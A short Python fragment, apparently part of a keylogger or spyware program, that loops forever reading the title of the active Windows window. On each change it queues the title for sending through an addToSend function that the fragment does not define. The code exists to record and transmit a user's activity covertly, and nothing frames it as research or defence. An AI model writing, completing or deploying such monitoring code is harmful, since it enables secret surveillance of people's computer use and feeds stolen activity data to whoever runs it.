from win32gui import GetWindowText, GetForegroundWindow
def current_window():
    recent_value = ""
    while 1:
        tmp_value = GetWindowText(GetForegroundWindow())
        if tmp_value != recent_value:
            recent_value = tmp_value
            if recent_value != "":
                addToSend("[Current window: "+recent_value+" ]")
Thread(target=current_window).start()
